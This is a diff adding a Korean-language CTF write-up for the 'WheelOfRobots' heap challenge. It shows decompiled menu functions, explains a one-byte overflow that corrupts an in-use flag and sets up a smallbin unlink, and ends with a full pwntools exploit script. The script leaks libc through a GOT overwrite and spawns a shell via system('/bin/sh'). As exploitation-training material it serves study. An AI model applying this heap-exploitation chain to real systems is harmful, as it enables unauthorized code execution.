@@ -1062,3 +1062,378 @@ signed __int64 sub_400BA9()
 ```
 
 4번 메뉴가 별게 없어서 그냥 보고 넘어갔는데 strlen(::s[v1]) 이 부분으로 릭하고 익스가 가능해보인다. 괜히 있는건 아니었던 모양이다. 16.04 이하 버전에서 포인터 놀음은 unlink가 참 좋은 것 같음
+
+<br>
+
+# WheelOfRobots
+
+또 다른 Unlink 문제인데 sleepyholder와 거의 비슷하게 풀었다.
+
+```c
+unsigned __int64 sub_400DF8()
+{
+  _WORD *v0; // rax
+  _WORD *v1; // rax
+  _DWORD *v2; // rax
+  _DWORD *v3; // rax
+  _QWORD *v4; // rax
+  unsigned int v5; // ST08_4
+  _WORD *v6; // rax
+  unsigned int v8; // [rsp+8h] [rbp-18h]
+  unsigned int v9; // [rsp+8h] [rbp-18h]
+  int v10; // [rsp+Ch] [rbp-14h]
+  char s; // [rsp+10h] [rbp-10h]
+  unsigned __int64 v12; // [rsp+18h] [rbp-8h]
+
+  v12 = __readfsqword(0x28u);
+  wheel_list((__int64)"Which robot do you want to add to the wheel?");
+  printf("Your choice :");
+  memset(&struct_atoi, 0, 4uLL);
+  v10 = input_num(&struct_atoi, 5uLL);
+  if ( (unsigned __int64)chunk_count <= 2 )
+  {
+    switch ( v10 )
+    {
+      case 1:
+        if ( !fastchunk_pointer )
+        {
+          buf = calloc(1uLL, 0x14uLL);
+          fastchunk_pointer = 1;
+          v0 = buf;
+          *(_QWORD *)buf = 'iT ynniT';
+          v0[4] = 'm';
+          ++chunk_count;
+        }
+        break;
+      case 2:
+        if ( !bender_pointer )
+        {
+          printf("Increase Bender's intelligence: ", 5LL);
+          memset(&s, 0, 5uLL);
+          v8 = input_num(&s, 5uLL);
+          if ( v8 > 4 )
+          {
+            puts("Sorry impossible to make bender as smart!");
+            v8 = 2;
+          }
+          bender_chunk = calloc(1uLL, 20 * v8);
+          bender_size = v8;
+          bender_pointer = 1;
+          v1 = bender_chunk;
+          *(_DWORD *)bender_chunk = 'dneB';
+          v1[2] = 're';
+          *((_BYTE *)v1 + 6) = 0;
+          ++chunk_count;
+        }
+        break;
+      case 3:
+        if ( !robot_devil_pointer )
+        {
+          printf("Increase Robot Devil's cruelty: ", 5LL);
+          memset(&s, 0, 5uLL);
+          v9 = input_num(&s, 5uLL);
+          if ( v9 > 99 )
+          {
+            puts("You are crazy!!");
+            v9 = 20;
+          }
+          robot_devil_chunk = calloc(1uLL, 20 * v9);
+          robot_devil_size = v9;
+          robot_devil_pointer = 1;
+          v2 = robot_devil_chunk;
+          *(_QWORD *)robot_devil_chunk = 'eD toboR';
+          v2[2] = 'liv';
+          ++chunk_count;
+        }
+        break;
+      case 4:
+        if ( !chain_pointer )
+        {
+          chain_chunk = calloc(1uLL, 0xFA0uLL);
+          v3 = chain_chunk;
+          *(_QWORD *)chain_chunk = 'mS niahC';
+          v3[2] = 'reko';
+          *((_BYTE *)v3 + 12) = 0;
+          chain_pointer = 1;
+          ++chunk_count;
+        }
+        break;
+      case 5:
+        if ( !dword_603128 )
+        {
+          qword_603108 = calloc(1uLL, 0x9C40uLL);
+          v4 = qword_603108;
+          *(_QWORD *)qword_603108 = 'anoilliB';
+          v4[1] = 'toB eri';
+          dword_603128 = 1;
+          ++chunk_count;
+        }
+        break;
+      case 6:
+        if ( !destructor_pointer )
+        {
+          printf("Increase Destructor's powerful: ", 5LL);
+          memset(&s, 0, 5uLL);
+          v5 = input_num(&s, 5uLL);
+          destructor_chunk = calloc(1uLL, 20 * v5);
+          destructor_size = v5;
+          destructor_pointer = 1;
+          v6 = destructor_chunk;
+          *(_QWORD *)destructor_chunk = 'tcurtseD';
+          v6[4] = 'ro';
+          *((_BYTE *)v6 + 10) = 0;
+          ++chunk_count;
+        }
+        break;
+      default:
+        return __readfsqword(0x28u) ^ v12;
+    }
+  }
+  else
+  {
+    puts("Wheel Of Robots is Full!");
+  }
+  return __readfsqword(0x28u) ^ v12;
+}
+```
+
+먼저 chunk 할당 하는 메뉴로 robot을 추가 하는 곳이다. 
+
+size가 정해진 것도 있고 임의로 할당 가능한 부분도 있다. v10 = input_num(&struct_atoi, 5uLL); 여기서 5byte를 입력하게 해주는데 atoi에 활용하는 Pointer는 0x603110 이다. 하지만 bender_pointer 이녀석이 0x603114에 존재한다. 고로 1byte가 오버 되면서 chunk flag를 설정할 수 있다. 이 문제는 chunk flag가 free로 지워지면 내용을 입력할 수가 없다. 굉장히 큰 값으로 할당하는 게 2개가 있기 때문에 case 2로 fastbin에 넣고 larg chunk를 할당해 smallbin으로 넣어 unlink를 할 수 있다.
+
+double free 까지는 필요 없고 smallbin에 담아 병합 시키기만 하면 된다. 중요한 건 size가 20 * input 이므로 특정 size만 다음 chunk의 prev_size를 건드릴 수 있다. 하지만 덮을 수 있는 건 prev_size 까지만 이다. prev_inuse flag는 컨트롤할 수 없기 때문에 chunk flag를 컨트롤해서 free된 chunk에 값을 입력할 수 있도록 해야 한다.
+
+```c
+__int64 sub_40120C()
+{
+  unsigned int v0; // ST0C_4
+  __int64 result; // rax
+
+  wheel_list((__int64)"Which robot do you want to remove from the wheel?");
+  printf("Your choice :");
+  memset(&struct_atoi, 0, 4uLL);
+  v0 = input_num(&struct_atoi, 4uLL);
+  result = v0;
+  switch ( v0 )
+  {
+    case 1u:
+      result = (unsigned int)fastchunk_pointer;
+      if ( fastchunk_pointer )
+      {
+        free(buf);
+        fastchunk_pointer = 0;
+        result = chunk_count-- - 1;
+      }
+      break;
+    case 2u:
+      result = (unsigned int)bender_pointer;
+      if ( bender_pointer )
+      {
+        free(bender_chunk);
+        bender_pointer = 0;
+        result = chunk_count-- - 1;
+      }
+      break;
+    case 3u:
+      result = (unsigned int)robot_devil_pointer;
+      if ( robot_devil_pointer )
+      {
+        free(robot_devil_chunk);
+        robot_devil_pointer = 0;
+        result = chunk_count-- - 1;
+      }
+      break;
+    case 4u:
+      result = (unsigned int)chain_pointer;
+      if ( chain_pointer )
+      {
+        free(chain_chunk);
+        chain_pointer = 0;
+        result = chunk_count-- - 1;
+      }
+      break;
+    case 5u:
+      result = (unsigned int)dword_603128;
+      if ( dword_603128 )
+      {
+        free(qword_603108);
+        dword_603128 = 0;
+        result = chunk_count-- - 1;
+      }
+      break;
+    case 6u:
+      result = (unsigned int)destructor_pointer;
+      if ( destructor_pointer )
+      {
+        free(destructor_chunk);
+        destructor_pointer = 0;
+        result = chunk_count-- - 1;
+      }
+      break;
+    default:
+      return result;
+  }
+  return result;
+}
+```
+
+free는 별거 없다 chunk flag를 지우고 free 한다.
+
+```c
+ssize_t sub_4013E0()
+{
+  unsigned int v0; // ST0C_4
+  ssize_t result; // rax
+
+  wheel_list((__int64)"Which robot's name do you want to change?");
+  printf("Your choice :");
+  memset(&struct_atoi, 0, 4uLL);
+  v0 = input_num(&struct_atoi, 4uLL);
+  result = v0;
+  switch ( v0 )
+  {
+    case 1u:
+      result = (unsigned int)fastchunk_pointer;
+      if ( fastchunk_pointer )
+      {
+        puts("Robot's name: ");
+        result = read(0, buf, 0x14uLL);
+      }
+      break;
+    case 2u:
+      result = (unsigned int)bender_pointer;
+      if ( bender_pointer )
+      {
+        puts("Robot's name: ");
+        result = read(0, bender_chunk, 20 * bender_size);
+      }
+      break;
+    case 3u:
+      result = (unsigned int)robot_devil_pointer;
+      if ( robot_devil_pointer )
+      {
+        puts("Robot's name: ");
+        result = read(0, robot_devil_chunk, 20 * robot_devil_size);
+      }
+      break;
+    case 4u:
+      result = (unsigned int)chain_pointer;
+      if ( chain_pointer )
+      {
+        puts("Robot's name: ");
+        result = read(0, chain_chunk, 0xFA0uLL);
+      }
+      break;
+    case 5u:
+      result = (unsigned int)dword_603128;
+      if ( dword_603128 )
+      {
+        puts("Robot's name: ");
+        result = read(0, qword_603108, 0x9C40uLL);
+      }
+      break;
+    case 6u:
+      result = (unsigned int)destructor_pointer;
+      if ( destructor_pointer )
+      {
+        puts("Robot's name: ");
+        result = read(0, destructor_chunk, 20 * destructor_size);
+      }
+      break;
+    default:
+      return result;
+  }
+  return result;
+}
+```
+
+robot의 이름을 설정하는 메뉴인데 할당한 size와 동일하게 입력하게 해주므로 특정 사이즈를 잘 이용해야 한다.
+
+4번 메뉴는 무슨 이상한 그림 print 해주는건데 쓸모없는 메뉴 인듯..
+
+결국 case 2 (fastbin) -> case 5 (fastbin -> smallbin) -> case 4(dummy chunk 이건 unlink하는데에는 지장없다. 나중을 위함) -> unlink 하면 pointer를 가질 수 있음!
+
+```python
+from pwn import *
+
+t = process('./wheelofrobots')
+
+r = lambda w: t.recvuntil(str(w))
+s = lambda z: t.sendline(str(z))
+
+def add(choice,size):
+	r("Your choice : ")
+	s("1")
+	r("choice :")
+	s(str(choice))
+	r(":")
+	s(str(size))
+
+def add_fast():
+	r("Your choice : ")
+	s("1")
+	r("choice :")
+	s("1")
+
+def add_large():
+	r("Your choice : ")
+	s("1")
+	r("choice :")
+	s("5")
+
+def add_dummy():
+	r("Your choice : ")
+	s("1")
+	r("choice :")
+	s("4")
+
+def modify(choice,name):
+	r("Your choice : ")
+	s("3")
+	r("choice :")
+	s(str(choice))
+	r(":")
+	t.send(str(name))
+
+def remove(choice):
+	r("Your choice : ")
+	s("2")
+	r("choice :")
+	s(str(choice))
+
+target = 0x6030f0
+free_got = 0x0000000000603018
+puts_plt = 0x0000000000400830
+puts_got = 0x0000000000603028
+
+add(2,2)
+add(3,12)
+remove(2)
+add_large()
+add_dummy()
+
+r("Your choice : ")
+s("1")
+r("choice :")
+s("7777" + "\x01") # chunk flag overwrite
+modify(2,p64(0) + p64(0x21) + p64(target-0x18) + p64(target-0x10) + p64(0x20))
+remove(3)
+
+modify(2,p64(0) + p64(puts_got)*2 + p64(free_got))
+modify(2,p64(puts_plt))
+remove(4)
+
+libc = u64(t.recv(6).ljust(8,'\x00')) -0x6f690
+log.success("libc ==> " + hex(libc))
+
+system = libc + 0x45390
+modify(2,p64(system))
+modify(5,"/bin/sh\x00")
+remove(5)
+
+pause()
+
+t.interactive()
+```
+
+dummy chunk를 만든 이유는 flag를 설정할 수 있는게 case 2 chunk밖에 없어서 추가적으로 free가 필요하기 때문에 하나 생성했다. how2heap 문제들을 풀다보니 계속해서 free를 이용해서 leak하고 익스하는데 유용하긴 한 것 같다.
